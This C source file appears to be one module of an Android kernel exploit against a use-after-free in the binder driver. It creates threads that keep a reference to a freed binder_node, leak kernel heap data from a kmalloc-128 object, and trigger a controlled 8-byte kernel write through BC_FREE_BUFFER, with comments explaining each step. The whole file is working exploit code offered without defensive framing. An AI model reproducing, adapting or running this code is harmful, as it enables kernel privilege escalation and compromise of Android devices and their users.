#include <stdio.h>
#include <stdint.h>
#include <pthread.h>
#include <errno.h>
#include <poll.h>
#include <sys/syscall.h>

#include "log.h"
#include "binder.h"
#include "endpoint.h"
#include "pending_node.h"

static struct pending_node *pending_nodes = NULL;
static uint64_t last_node_th = 0;

static struct pending_node *pending_node_new(void)
{
	struct pending_node *node = NULL;

	node = malloc(sizeof(*node));
	if (!node) {
		log_err("malloc: %s\n", strerror(errno));
		return NULL;
	}

	memset(node, 0, sizeof(*node));

	if (pthread_barrier_init(&node->barrier, NULL, 2)) {
		log_err("pthread_barrier_init: %s\n", strerror(errno));
		free(node);
		return NULL;
	}

	if (pthread_barrier_init(&node->ready, NULL, 2)) {
		log_err("pthread_barrier_init: %s\n", strerror(errno));
		free(node);
		return NULL;
	}

	if (pthread_barrier_init(&node->do_barrier, NULL, 2)) {
		log_err("pthread_barrier_init: %s\n", strerror(errno));
		free(node);
		return NULL;
	}

	if (pthread_barrier_init(&node->done_barrier, NULL, 2)) {
		log_err("pthread_barrier_init: %s\n", strerror(errno));
		free(node);
		return NULL;
	}


	/* Insert in front. */
	node->next = pending_nodes;
	pending_nodes = node;

	return node;
}

static struct pending_node *pending_node_get(pthread_t node_th)
{
	struct pending_node *tmp = pending_nodes;

	while (tmp) {
		if (tmp->uaf_node_th == node_th)
			return tmp;
		tmp = tmp->next;
	}

	return NULL;
}

/*
 * This thread keep a reference to the freed binder_node, which allows leaking a qword at offset 0x58
 * and 0x60 of an object in the kmalloc-128 slab, as well a trigerring a controlled write8
 */
void *pending_node_thread(void *args)
{
	struct pending_node *node = (struct pending_node *)args;
	uint32_t remaining = 0, consumed = 0;
	uint32_t looper = BC_ENTER_LOOPER;
	struct binder_io msg, reply;
	struct binder_state *from = node->bs;
	uint64_t handle = node->uaf_node;
	uint8_t msg_data[0x1000], reply_data[0x1000];
	uint64_t res = -1;
	int signo;
	sigset_t set;
   uint64_t retval = 0;

	/* Enter looper. */
	binder_write(from, &looper, sizeof(looper));

	struct binder_transaction_data *t = (struct binder_transaction_data *)(msg_data + sizeof(uint32_t));
	make_transaction(msg_data, false, handle, reply_data, 0x10, NULL, 0);
	/* Fix transaction code. */
	t->code = ADD_PENDING_NODE;
	/* Make the call. */
	binder_write(from, msg_data, sizeof(*t) + sizeof(uint32_t));

	/* Poll for the answer. */
	/* Wait for BR_TRANSACTION_COMPLETE. */
	struct pollfd pfd;
	pfd.fd = from->fd;
	pfd.events = POLLIN;
	/* Wait up to a sec. */
	if (!poll(&pfd, 1, 1000)) {
		fprintf(stderr, "[-] Something went wrong will inserting the pending node.\n");
		pthread_exit(&res);
	}

	pthread_barrier_wait(&node->ready);
	
	pthread_barrier_wait(&node->ready);

   /* We wait here, until ask by the exploit to leak values from the transaction. */
   pthread_barrier_wait(&node->do_barrier); //Do leak

	/* Reading back transaction. */
	consumed = remaining = 0;
   uint32_t cmd;
	do {
      cmd = binder_read_next(from, reply_data, &remaining, &consumed);
   } while (cmd != BR_TRANSACTION && cmd != BR_REPLY); 

   /* Getting a BR_REPLY, would mean that we successfully cleaned up the transaction. */
   if (cmd == BR_REPLY)  {
      goto end;
   }
   
   t = (struct binder_transaction_data *)(reply_data + consumed - sizeof(*t));
	/* data at offset 0x58. */
	node->uaf_buffer = t->data.ptr.buffer;

	node->leaked_data[0] = t->target.ptr; /* data at offset 0x58. */
	node->leaked_data[1] = t->cookie;	/* data at offset 0x60. */

	/* Check the node state. */
	if (node->state == NODE_FINISHED)
		goto end;

   node->state = NODE_LEAKED;

   pthread_barrier_wait(&node->done_barrier);
   pthread_barrier_wait(&node->ready);

   /* This for sync. */

   pthread_barrier_wait(&node->do_barrier);

	/* Check the node state. */
	if (node->state == NODE_FINISHED)
		goto end;


	/* If we decide to go ahead with the buffer freeing, wait on the barrier,
	 * otherwise just exit the thread.
	 */
   binder_free_buffer(from, node->uaf_buffer);
   node->state = NODE_FREE;
end:
   pthread_barrier_wait(&node->done_barrier);
   ioctl(node->bs->fd, BINDER_THREAD_EXIT, 0);
	pthread_exit(&retval);
}



static void pending_node_create_thread(void *args)
{
	struct binder_state *bs = (struct binder_state *)*(uint64_t *)args;
	uint64_t node = *(uint64_t *)(args + 8);

	/* Create a ONE_WAY transaction to ask the endpoint to create a pending_node
	 * back to us.
	 */
	struct binder_transaction_data *t;
	uint8_t rdata[128];
	uint8_t txn_data[128];

	uint32_t remaining = 0, consumed = 0;
	struct binder_io msg, reply;

	/* Register this thread as a looper. */
	uint32_t looper = BC_ENTER_LOOPER;
	binder_write(bs, &looper, sizeof(looper));


	/* Send the ONE_WAY transaction. */
	t = (struct binder_transaction_data *)(txn_data + sizeof(uint32_t));
	make_transaction(txn_data, true, node, rdata, 0x8, NULL, 0);
	/* Fix transaction code. */
	t->code = ADD_PENDING_NODE;
	// printf("[*] About to make node\n");
	// getchar();
	/* Make the binder call. */
	binder_write(bs, txn_data, sizeof(*t) + sizeof(uint32_t));

	/* Wait for the transaction from the endpoint. */
	while (binder_read_next(bs, rdata, &remaining, &consumed) != BR_TRANSACTION);


	// printf("[*] Node should be made\n");
	// getchar();

	/* Get transaction. */
	t = (struct binder_transaction_data *)(rdata + consumed - sizeof(*t));

	if (t->code != ADD_PENDING_NODE) {
		fprintf(stderr, "[-] Invalid transaction code %x. Expected %x\n", t->code, ADD_PENDING_NODE);
		exit(1);
	}

	/* Free the buffer. */
	binder_free_buffer(bs, t->data.ptr.buffer);

	/* Okay, so instead of a reply, we send a new transaction here, in order to have the thing go into the pending node list. */
	t = (struct binder_transaction_data *)(txn_data + sizeof(uint32_t));
	make_transaction(txn_data, false, node, rdata, 0x10, NULL, 0);
	/* Fix transaction code. */
	t->code = ADD_PENDING_NODE;
	/* Make the call. */
	binder_write(bs, txn_data, sizeof(*t) + sizeof(uint32_t));

	int res = 0;
	pthread_exit(&res);
}

/*
 * The endpoint calls into this function to setup a pending node.
 */
pthread_t add_pending_node(struct binder_state *from, uint64_t pending_node)
{
	pthread_t th;

	struct pending_node *node = NULL;

	/* Create new pending_node */
	node = pending_node_new();
	if (!node)
		return NULL;

	node->bs = from;
	node->uaf_node = pending_node;

	if (pthread_create(&th, NULL, pending_node_thread, (void *)node)) {
		perror("pthread");
		return (pthread_t)-1;
	}

	node->uaf_node_th = th;
	last_node_th = th;

	pthread_barrier_wait(&node->ready);
	
   return th;
}


/*
 * The endpoint calls into this function to
 * remove a specific pending node.
 */
void terminate_pending_node(pthread_t th)
{
	/* Just unlock the barrier, and pthread_join */
	struct pending_node *node = pending_node_get(th);
	if (!node)
		return ;


   pthread_barrier_wait(&node->ready);
   node->state = NODE_FINISHED;
   node->uaf_buffer = 0;
   pthread_barrier_wait(&node->do_barrier);
   pthread_barrier_wait(&node->done_barrier);
	pthread_join(node->uaf_node_th, NULL);

	/* Remove node. */
	
	struct pending_node *tmp = pending_nodes;
	if (tmp == node) {
		pending_nodes = node->next;

	} else {
		while (tmp->next != node)
			tmp = tmp->next;

		tmp->next = node->next;
	}
	free(node);
}


/*
 * Perform a ADD_PENDING_NODE binder query, in order to ask the remote
 * endpoint to create a pending node transaction.
 */
pthread_t pending_node_create(struct binder_state *bs, uint64_t node)
{
	uint64_t args[] = {bs, node};
	pthread_t th;

	if (pthread_create(&th, NULL, pending_node_create_thread, (void *)args)) {
		perror("pthread create\n");
		exit(0);
	}

	pthread_join(th, NULL);

	return last_node_th;
}

void pending_node_free(struct binder_state *bs, uint64_t node, uint64_t vma_start, uint32_t strong, uint32_t weak, bool second)
{
	/* So we have our pending node in another thread. Now release our reference to uaf_node
	 * and trigger the bug (3 times needs) to free the uaf_node, while the pending node thread keeps
	 * a reference to it (as target_node)
	 */
	int i;
	for (i = 0; i < strong; i++)
		dec_node(bs, node, vma_start, true, second);

	for (i = 0; i < weak; i++)
		dec_node(bs, node, vma_start, false, second);
}

/*
 * Trigger a write8, by having the pending node thread
 * calling BC_FREE_BUFFER, which will enter the
 * `binder_dec_node()` function with (hopefully) controlled
 * `binder_node`, ultimately leading to a controlled
 * write8
 */
void pending_node_write8(pthread_t th)
{
	struct pending_node *node = pending_node_get(th);
	if (!node)
		return ;
	/* Buffer release. */

   pthread_barrier_wait(&node->ready);
   pthread_barrier_wait(&node->do_barrier);
   pthread_barrier_wait(&node->done_barrier);
   pthread_join(th, NULL);
	
   struct pending_node *tmp = pending_nodes;
	if (tmp == node) {
		pending_nodes = node->next;

	} else {
		while (tmp->next != node)
			tmp = tmp->next;

		tmp->next = node->next;
	}

	free(node);
}

/*
 * Kindly ask the endpoint to terminate a specific pending node thread.
 */
void pending_node_terminate(struct binder_state *bs, uint64_t handle, pthread_t th)
{
	uint8_t txn_data[0x100];
	uint8_t reply_data[0x100];
	struct binder_io msg, reply;


	bio_init(&msg, txn_data, sizeof(txn_data), 10);
	bio_init(&reply, reply_data, sizeof(reply_data), 10);

	bio_put_uint32(&msg, (uint32_t)th);
	bio_put_uint32(&msg, (uint32_t)((uint64_t)(th)>>32));
	binder_call(bs, &msg, &reply, handle, TERMINATE_PENDING_NODE);

	binder_free_buffer(bs, reply.data0);
}

/*
 * Leak the 2 qword of data from the UAFed pending node.
 * It has the side effect or terminating the pending_node_thread
 */
void pending_node_leak(pthread_t th, uint64_t *q1, uint64_t *q2)
{
	struct pending_node *node = pending_node_get(th);
	if (!node)
		return;
	/* Okay spray epoll structures. */
   pthread_barrier_wait(&node->ready);
   pthread_barrier_wait(&node->do_barrier);
   pthread_barrier_wait(&node->done_barrier);
	/* Inspecting node value. */

	if (q1)
		*q1 = node->leaked_data[0];
	if (q2)
		*q2 = node->leaked_data[1];
}
